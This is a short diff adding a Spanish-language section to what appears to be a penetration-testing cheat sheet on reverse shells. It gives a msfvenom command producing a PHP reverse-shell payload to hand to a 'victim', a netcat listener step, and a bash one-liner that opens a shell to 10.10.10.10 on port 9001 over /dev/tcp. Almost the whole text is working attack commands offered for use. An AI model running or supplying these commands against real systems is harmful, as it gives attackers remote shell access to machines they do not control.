@@ -31,3 +31,16 @@ run
 # Ya solo falta ejecutar el .exe y recibiremos la sesión de meterpreter
 
 ```
+
+#### Payload reverse shell PHP
+```bash
+#Generamos el payload y lo compartimos con la víctima
+msfvenom -p php/reverse_php LHOST=<ip_atacante> LPORT=<puerto_atacante> -f raw > pwned.php
+
+Ahora nos ponemos a la escucha con netcat y listo. IMPORTANTE, esta conexion se puede cerrar. así que una vez dentro es conveniente ejecutar una nueva reverse shell.
+
+# Segunda reverse shell
+bash -c "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1"
+
+y nos ponemos a la escucha con netcat
+```
